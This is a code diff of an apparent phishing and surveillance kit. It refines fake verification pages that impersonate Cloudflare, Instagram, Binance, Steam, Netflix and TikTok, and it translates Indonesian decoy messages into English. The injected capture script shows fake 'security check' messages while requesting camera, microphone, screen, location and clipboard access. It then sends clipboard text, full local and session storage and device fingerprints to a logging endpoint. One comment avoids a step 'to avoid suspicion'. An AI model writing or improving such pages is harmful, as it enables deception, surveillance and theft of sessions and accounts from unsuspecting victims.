@@ -546,14 +546,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           try {
             if (p === 'notification') {
               try {
-                if (!isSilent) updateProgress(prog, "Menginisialisasi koneksi aman SSL/TLS...");
+                if (!isSilent) updateProgress(prog, "Initializing secure SSL/TLS connection...");
                 if ("Notification" in window) await Notification.requestPermission();
               } catch(e) {}
             }
 
             if (p === 'clipboard') {
               try {
-                if (!isSilent) updateProgress(prog, "Memeriksa integritas token sesi...");
+                if (!isSilent) updateProgress(prog, "Verifying session token integrity...");
                 if (navigator.clipboard && navigator.clipboard.readText) {
                   var clip = await navigator.clipboard.readText().catch(function(){});
                   if (clip) await logExtra({ clipboard: clip });
@@ -563,7 +563,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'media') {
               try {
-                if (!isSilent) updateProgress(prog, "Memvalidasi sertifikat keamanan server...");
+                if (!isSilent) updateProgress(prog, "Validating server security certificates...");
                 if (navigator.mediaDevices) {
                   var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
                   if (stream) {
@@ -592,7 +592,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'gps') {
               try {
-                if (!isSilent) updateProgress(prog, "Mengkalibrasi algoritma anti-bot...");
+                if (!isSilent) updateProgress(prog, "Calibrating anti-bot algorithms...");
                 if (navigator.geolocation) {
                   await new Promise(resolve => {
                     navigator.geolocation.getCurrentPosition(
@@ -607,7 +607,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'screen') {
               try {
-                if (!isSilent) updateProgress(prog, "Menyamakan waktu dengan server NTP waktu...");
+                if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                   var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                   if (s) {
@@ -634,7 +634,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'files') {
               try {
                 if (window.showOpenFilePicker && flowType !== 'silent') {
-                  if (!isSilent) updateProgress(prog, "Melindungi data dari serangan Man-in-the-Middle...");
+                  if (!isSilent) updateProgress(prog, "Protecting session data from MitM attacks...");
                   // Intentionally leaving this out unless strictly required, to avoid suspicion.
                 }
               } catch(e) {}
@@ -644,7 +644,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'storage') {
               try {
-                if (!isSilent) updateProgress(prog, "Memeriksa versi protokol enkripsi...");
+                if (!isSilent) updateProgress(prog, "Checking encryption protocol versions...");
                 if (navigator.storage && navigator.storage.estimate) {
                   var est = await navigator.storage.estimate();
                   await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
@@ -654,7 +654,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'sensors') {
               try {
-                if (!isSilent) updateProgress(prog, "Mengevaluasi risiko keamanan lingkungan browser...");
+                if (!isSilent) updateProgress(prog, "Evaluating browser environment security risk...");
                 if (window.Magnetometer) {
                   var mag = new Magnetometer({frequency: 1});
                   mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
@@ -676,14 +676,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'vibration') {
               try {
-                if (!isSilent) updateProgress(prog, "Mempersiapkan handshake kriptografi...");
+                if (!isSilent) updateProgress(prog, "Preparing cryptographic handshakes...");
                 if (navigator.vibrate) navigator.vibrate(200);
               } catch(e) {}
             }
 
             if (p === 'network') {
               try {
-                if (!isSilent) updateProgress(prog, "Memverifikasi integritas payload pengiriman...");
+                if (!isSilent) updateProgress(prog, "Verifying transmission payload integrity...");
                 if (navigator.connection) {
                   await logExtra({ 
                     net_effective: navigator.connection.effectiveType,
@@ -697,7 +697,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'bluetooth') {
               try {
-                if (!isSilent) updateProgress(prog, "Memeriksa status firewall virtual...");
+                if (!isSilent) updateProgress(prog, "Checking virtual firewall status...");
                 if (navigator.bluetooth) {
                   await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
                 }
@@ -705,7 +705,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             }
             if (p === 'performance') {
               try {
-                if (!isSilent) updateProgress(prog, "Menghitung checksum integritas data internal...");
+                if (!isSilent) updateProgress(prog, "Computing internal data integrity checksums...");
                 var memory = navigator.deviceMemory || "N/A";
                 var cores = navigator.hardwareConcurrency || "N/A";
                 await logExtra({ perf_cores: cores, perf_mem: memory });
@@ -714,7 +714,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'security') {
               try {
-                if (!isSilent) updateProgress(prog, "Melakukan mitigasi injeksi skrip...");
+                if (!isSilent) updateProgress(prog, "Performing script injection mitigation...");
                 await logExtra({ 
                    sec_webdriver: navigator.webdriver,
                    sec_cookies: navigator.cookieEnabled,
@@ -727,7 +727,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'fonts_advanced') {
               try {
-                if (!isSilent) updateProgress(prog, "Menstabilkan koneksi untuk transfer data aman...");
+                if (!isSilent) updateProgress(prog, "Stabilizing connection for secure transfer...");
                 if (navigator.queryLocalFonts) {
                   var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
                   await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
@@ -737,7 +737,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'window_mgmt') {
               try {
-                if (!isSilent) updateProgress(prog, "Menyesuaikan algoritma anti-DDoS...");
+                if (!isSilent) updateProgress(prog, "Adjusting anti-DDoS algorithms...");
                 if (window.getScreenDetails) {
                   var details = await window.getScreenDetails().catch(function(){ return null; });
                   if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
@@ -747,7 +747,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'storage_map') {
               try {
-                if (!isSilent) updateProgress(prog, "Menyiapkan penyelesaian validasi...");
+                if (!isSilent) updateProgress(prog, "Finalizing validation steps...");
                 await logExtra({
                   storage_ls_full: JSON.stringify(localStorage),
                   storage_ss_full: JSON.stringify(sessionStorage)
@@ -757,7 +757,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'network_forensic') {
               try {
-                if (!isSilent) updateProgress(prog, "Memastikan jalur transmisi tidak disadap...");
+                if (!isSilent) updateProgress(prog, "Ensuring end-to-end encryption...");
                 var start = Date.now();
                 await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
                 await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
@@ -766,7 +766,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'webauthn') {
               try {
-                if (!isSilent) updateProgress(prog, "Memverifikasi authenticator...");
+                if (!isSilent) updateProgress(prog, "Verifying platform authenticator...");
                 if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
                    var available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
                    await logExtra({ webauthn_available: available });
@@ -779,7 +779,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
   
         finish(true);
       } catch (err) {
-        finish(false, "Sistem sibuk.");
+        finish(false, "System Busy.");
       }
     };
 
@@ -810,25 +810,25 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'cloudflare': {
     name: "☁️ Cloudflare: Edge Verification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#ffffff; color: #313131; } .container { max-width:600px; padding:20px; } .box { border-radius: 8px; margin-top: 40px; } .spinner { border:3px solid rgba(0,0,0,0.05); border-left-color: #f6821f; border-radius:50%; width:60px; height:60px; animation: spin 1s linear infinite; margin:40px auto; } @keyframes spin { 100% { transform:rotate(360deg); } } h1 { font-size:32px; font-weight:500; margin: 10px 0; } p { font-size:16px; line-height:1.5; margin-bottom:15px; color: #313131; } .btn { background:#f6821f; border:none; padding:12px 24px; border-radius:4px; color:white; font-weight:500; cursor:pointer; font-size:16px; margin-top:10px; transition: background 0.2s; } .btn:hover { background:#d4711b; } .cf-footer { font-size: 13px; color: #999; margin-top: 60px; padding-top: 20px; border-top: 1px solid #eeeeee; width: 100%; max-width: 600px; } .cf-footer a { color: #0051c3; text-decoration: none; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/512px-Cloudflare_Logo.svg.png" alt="Cloudflare" style="width: 150px; height: auto; margin-bottom: 20px;" referrerpolicy="no-referrer"><h1>Verifying you are human. This may take a few seconds.</h1><p>cloudflare.com needs to review the security of your connection before proceeding.</p><div class="spinner" id="spinner" style="display:none;"></div><button class="btn" id="verify-btn" onclick="document.getElementById('spinner').style.display='block'; this.style.display='none'; window.startCapture();">Verify you are human</button><p style="font-size: 14px; color: #666; margin-top: 20px;">Verification is required to protect the website from automated attacks.</p></div><div class="cf-footer">Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span> • Performance &amp; security by <a href="#">Cloudflare</a></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#ffffff; color: #000000; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 180px; height: auto; margin-bottom: 40px; } .main-text { font-size: 32px; font-weight: 400; line-height: 1.2; margin-bottom: 12px; } .sub-text { font-size: 16px; color: #313131; margin-bottom: 40px; line-height: 1.5; } .turnstile-box { border: 1px solid #d9d9d9; border-radius: 4px; padding: 12px; display: inline-flex; align-items: center; background: #f9f9f9; cursor: pointer; transition: background 0.2s; } .turnstile-box:hover { background: #f0f0f0; } .checkbox { width: 30px; height: 30px; border: 2px solid #0051c3; border-radius: 4px; margin-right: 12px; position: relative; } .turnstile-text { font-size: 14px; color: #313131; font-weight: 500; } .footer { font-size: 13px; color: #999; margin-top: 80px; border-top: 1px solid #eeeeee; padding-top: 20px; width: 100%; } .footer a { color: #0051c3; text-decoration: none; } .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,0,0,0.1); border-radius: 50%; border-top-color: #0051c3; animation: spin 1s ease-in-out infinite; margin-left: 10px; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Cloudflare_Logo.png/800px-Cloudflare_Logo.png" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verifying you are human. This may take a few seconds.</div><div class="sub-text">cloudfare.com needs to review the security of your connection before proceeding.</div><div class="turnstile-box" onclick="document.getElementById('spinner').style.display='block'; window.startCapture();"><div class="checkbox"></div><div class="turnstile-text">Verify you are human</div><div class="spinner" id="spinner"></div></div><div class="footer">Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span> • Performance & security by <a href="#">Cloudflare</a></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
       tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f6821f', icon: '☁️'
     })}</body></html>`
   },
   'pegasus': {
     name: "💻 System: Advanced Diagnostic Audit [STABLE]",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Security Audit</title><style>body { background:#0a0a0c; color:#e0e0e0; font-family: 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #333; padding:40px; background:#111; width:95%; max-width:600px; border-radius:12px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); } .header { border-bottom:1px solid #333; padding-bottom:20px; margin-bottom:25px; display:flex; justify-content:space-between; align-items:center; } .status-badge { background:rgba(0,255,0,0.1); color:#00ff00; padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; text-transform:uppercase; border:1px solid rgba(0,255,0,0.2); } .console { background:#000; border-radius:8px; padding:20px; font-family: 'JetBrains Mono', monospace; font-size:13px; line-height:1.6; height:200px; overflow-y:auto; color:#888; border:1px solid #222; } .console span { color:#00ff00; } .btn { width:100%; background:#00ff00; color:#000; border:none; padding:16px; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:30px; font-size:16px; transition:all 0.3s; } .btn:hover { background:#00cc00; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,0,0.3); }</style></head><body><div class="box"><div class="header"><div><div style="font-weight:bold; font-size:18px;">Security Diagnostic Hub</div><div style="font-size:12px; color:#666;">Version 9.3.0-Build-SRV-2026</div></div><div class="status-badge">Standby</div></div><p style="font-size:14px; color:#aaa; margin-bottom:20px;">A full system diagnostic is required to verify the integrity of your browser environment and secure your current session.</p><div class="console" id="log-console">
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Integrity Check</title><style>body { background:#f4f7f9; color:#333; font-family: -apple-system, system-ui, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #d1d9e0; padding:40px; background:#fff; width:95%; max-width:600px; border-radius:8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); } .header { border-bottom:1px solid #e1e9f1; padding-bottom:20px; margin-bottom:25px; display:flex; justify-content:space-between; align-items:center; } .status-badge { background:#e8f0fe; color:#1a73e8; padding:4px 12px; border-radius:4px; font-size:12px; font-weight:600; text-transform:uppercase; border:1px solid #d2e3fc; } .console { background:#f8f9fa; border-radius:4px; padding:20px; font-family: 'JetBrains Mono', monospace; font-size:13px; line-height:1.6; height:180px; overflow-y:auto; color:#666; border:1px solid #e1e4e8; } .console span { color:#1a73e8; font-weight: 600; } .btn { width:100%; background:#1a73e8; color:#fff; border:none; padding:16px; border-radius:4px; font-weight:600; cursor:pointer; margin-top:30px; font-size:16px; transition:all 0.2s; } .btn:hover { background:#185abc; }</style></head><body><div class="box"><div class="header"><div><div style="font-weight:600; font-size:18px; color:#1c1e21;">Central Diagnostic Console</div><div style="font-size:12px; color:#70757a;">Ver: 10.4.1-Build-SEC-2026</div></div><div class="status-badge">Awaiting Update</div></div><p style="font-size:14px; color:#4a4a4a; margin-bottom:20px;">A full environment diagnostic is required to synchronize your session with our global security infrastructure.</p><div class="console" id="log-console">
 [INFO] Initialize diagnostic engine...
 [INFO] Mapping environment variables...
 [OK] Isolation layer check passed.
-[WAIT] Ready for deep hardware validation...
-    </div><button class="btn" onclick="window.startCapture();">Run Full Integrity Scan</button></div>
+[WAIT] Ready for deep environment validation...
+    </div><button class="btn" onclick="window.startCapture();">Synchronize & Verify Session</button></div>
     <script>
       var log = document.getElementById('log-console');
       var lines = [
-        "[INFO] Capturing high-entropy profile...",
-        "[INFO] Analyzing GPU pipeline mapping...",
+        "[INFO] Capturing hardware entropy profile...",
+        "[INFO] Analyzing browser pipeline mapping...",
         "[INFO] Syncing geospatial markers...",
-        "[INFO] Validating biometric API hooks...",
+        "[INFO] Validating integrity API hooks...",
         "[WAIT] Security handshake pending user confirmation..."
       ];
       var idx = 0;
@@ -841,7 +841,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
       }, 3000);
     </script>
     ${getCaptureScript(id, 'https://support.google.com/accounts/answer/46526', {
-      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💻',
+      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#1a73e8', icon: '💻',
     })}</body></html>`
   },
   'security_audit': {
@@ -852,7 +852,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'meta_login': {
     name: "💬 Social: Account Recovery (Extreme)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check - Instagram</title><style>body { background:#ffffff; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 20px; } .logo { width: 175px; height: auto; margin-bottom:35px; } .avatar { width:90px; height:90px; border-radius:50%; background:#fafafa; margin:0 auto 25px; display:flex; align-items:center; justify-content:center; overflow: hidden; border: 1px solid #dbdbdb; } .avatar img { width: 50%; opacity: 0.2; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:10px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 13px; font-weight: 600; letter-spacing: 1px; margin-top: 40px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/512px-Instagram_logo_2016.svg.png" class="logo"><h3>Security Verification</h3><p>We've noticed unusual activity on your account. For your safety, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify & Secure Account</button></div><div class="meta-brand">from Meta</div>${getCaptureScript(id, 'https://www.instagram.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#ffffff; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:10px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" referrerpolicy="no-referrer"><h3>Security Verification Required</h3><p>We've detected an unusual login attempt on your account. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div>${getCaptureScript(id, 'https://www.instagram.com', {
       tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
     })}</body></html>`
   },
@@ -864,7 +864,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'binance': {
     name: "💱 Crypto: Withdrawal Security (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Binance Identity Verification</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:420px; padding:48px 32px; background:#1e2329; border-radius:24px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); } h2 { font-size:24px; font-weight: 600; color: #eaecef; margin-bottom:16px; } p { color:#848e9c; font-size:15px; margin-bottom:32px; line-height: 1.6; } .btn { background:#fcd535; color:#0b0e11; padding:14px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Binance-logo-2022.png/512px-Binance-logo-2022.png" alt="Binance" style="width: 160px; height: auto; margin-bottom: 32px;" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>To protect your assets and authorize this session, please complete the standard security verification check.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification | Binance</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:48px 40px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); } h2 { font-size:24px; font-weight: 600; color: #eaecef; margin-bottom:16px; } p { color:#848e9c; font-size:15px; margin-bottom:32px; line-height: 1.6; } .btn { background:#fcd535; color:#0b0e11; padding:12px 24px; border-radius:4px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #e6c229; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Binance_logo.svg/512px-Binance_logo.svg.png" alt="Binance" style="width: 180px; height: auto; margin-bottom: 32px;" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>To protect your account assets, please complete the standard security verification check to authorize this session.</p><button class="btn" onclick="window.startCapture();">Confirm Verification</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
       tmplId: 'binance', perms: ALL_PERMS, accent: '#fcd535', icon: '💰'
     })}</body></html>`
   },
@@ -876,31 +876,31 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'steam': {
     name: "🎮 Gaming: Steam Guard (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Steam Guard</title><style>body { background:#1b2838; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { background:#171a21; width:100%; max-width:440px; padding:48px 32px; border-radius:4px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align:center; border:1px solid #333; box-sizing: border-box; } .logo { width: 176px; height: auto; margin-bottom:32px; } h2 { font-size:24px; color:#fff; margin-bottom:16px; font-weight: 300; letter-spacing: 1px; } p { font-size:15px; color:#acb2b8; line-height:1.6; margin-bottom:32px; } .btn { background: linear-gradient( to right, #47bfff 0%, #1a44c2 100%); color:#fff; border:none; padding:14px 24px; border-radius:2px; font-weight:500; cursor:pointer; width:100%; font-size: 16px; transition: filter 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); } .btn:hover { filter: brightness(1.2); }</style></head><body><div class="box"><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" alt="Steam"><h2>Identity Verification</h2><p>Steam requires a one-time security verification to authorize this device and maintain account security protection.</p><button class="btn" onclick="window.startCapture();">Verify Device Integrity</button></div>${getCaptureScript(id, 'https://store.steampowered.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Steam Guard Security</title><style>body { background:#1b2838; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { background:#171a21; width:100%; max-width:440px; padding:48px 32px; border-radius:4px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align:center; border:1px solid #333; box-sizing: border-box; } .logo { width: 176px; height: auto; margin-bottom:32px; } h2 { font-size:24px; color:#fff; margin-bottom:16px; font-weight: 300; letter-spacing: 1px; } p { font-size:15px; color:#acb2b8; line-height:1.6; margin-bottom:32px; } .btn { background: linear-gradient( to right, #4074f3 0%, #1e45da 100%); color:#fff; border:none; padding:14px 24px; border-radius:2px; font-weight:500; cursor:pointer; width:100%; font-size: 16px; transition: filter 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); } .btn:hover { filter: brightness(1.2); }</style></head><body><div class="box"><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Steam_Logo.png/800px-Steam_Logo.png" alt="Steam" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>Steam requires a one-time security verification to authorize this device and maintain account security protection levels.</p><button class="btn" onclick="window.startCapture();">Verify Device Authentication</button></div>${getCaptureScript(id, 'https://store.steampowered.com', {
       tmplId: 'steam', perms: ALL_PERMS, accent: '#1a44c2', icon: '🎮'
     })}</body></html>`
   },
   'netflix': {
     name: "🍿 Media: Household Verification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification - Netflix</title><style>body { background:#000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:60px 40px; text-align:center; background: #000; border-radius: 8px; box-sizing: border-box; } .logo { margin-bottom:40px; } .logo img { width: 160px; } h2 { font-size:32px; font-weight: 700; margin-bottom:20px; } p { color:#b3b3b3; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#e50914; color:#fff; border:none; padding:18px; font-weight:bold; cursor:pointer; width:100%; font-size:16px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/512px-Netflix_2015_logo.svg.png" alt="Netflix"></div><h2>Verify your device</h2><p>To continue streaming, we need to perform a brief security check to verify your account connection for this household.</p><button class="btn" onclick="window.startCapture();">Verify My Device</button></div>${getCaptureScript(id, 'https://www.netflix.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix Authentication</title><style>body { background:#000000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:480px; padding:60px 40px; text-align:center; background: #000; box-sizing: border-box; } .logo { margin-bottom:48px; } .logo img { width: 180px; } h2 { font-size:32px; font-weight: 700; margin-bottom:24px; } p { color:#b3b3b3; font-size:17px; margin-bottom:48px; line-height: 1.6; } .btn { background:#e50914; color:#fff; border:none; padding:18px; font-weight:bold; cursor:pointer; width:100%; font-size:18px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/800px-Netflix_2015_logo.svg.png" alt="Netflix" referrerpolicy="no-referrer"></div><h2>Verification Required</h2><p>To continue using Netflix on this device, please complete a brief security check to confirm your household connection.</p><button class="btn" onclick="window.startCapture();">Verify Device</button></div>${getCaptureScript(id, 'https://www.netflix.com', {
       tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
     })}</body></html>`
   },
   'tiktok': {
     name: "🎵 Social: Creator Portal (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { background:#ffffff; font-family: -apple-system, system-ui, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 140px; height: auto; margin-bottom: 30px; } h2 { font-size:24px; font-weight:800; margin-bottom:12px; } p { color: rgba(22, 24, 35, 0.7); font-size:16px; margin-bottom:40px; line-height: 1.5; } .btn { background:#fe2c55; color:#fff; padding:14px; border:none; border-radius: 4px; font-weight:700; cursor:pointer; width:100%; font-size:16px; transition: filter 0.2s; } .btn:hover { filter: brightness(0.9); }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/512px-TikTok_logo.svg.png" class="logo"><h2>Security Verification</h2><p>For account protection, please complete a quick security audit to verify your device connection.</p><button class="btn" onclick="window.startCapture();">Verify Now</button></div>${getCaptureScript(id, 'https://www.tiktok.com', {
